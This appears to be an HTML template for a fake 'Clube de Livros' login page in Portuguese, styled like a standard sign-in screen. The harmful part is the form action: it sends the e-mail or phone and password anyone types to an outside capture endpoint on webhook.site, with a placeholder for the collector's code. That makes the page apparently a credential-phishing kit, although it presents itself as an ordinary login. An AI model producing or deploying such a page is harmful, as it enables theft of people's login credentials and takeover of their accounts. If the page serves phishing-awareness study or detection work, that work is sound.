
<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Clube de Livros - Login</title>
  <link rel="stylesheet" href="style.css" />
  <link rel="icon" href="images/favicon.png" type="image/png" />
</head>
<body>
  <div class="login-container">
    <div class="login-box">
      <img src="images/logo.png" alt="Logo do site" class="logo">
      <h2>Bem-vindo ao Clube de Livros</h2>
      <p class="subtitle">Faça login para continuar</p>
      <form action="https://webhook.site/SEU-CÓDIGO-AQUI" method="POST">
        <input type="email" name="email" placeholder="E-mail ou telefone" required />
        <input type="password" name="senha" placeholder="Senha" required />
        <button type="submit">Próxima</button>
        <div class="footer-link">
          <a href="#">Esqueceu a senha?</a>
        </div>
      </form>
    </div>
  </div>
</body>
</html>
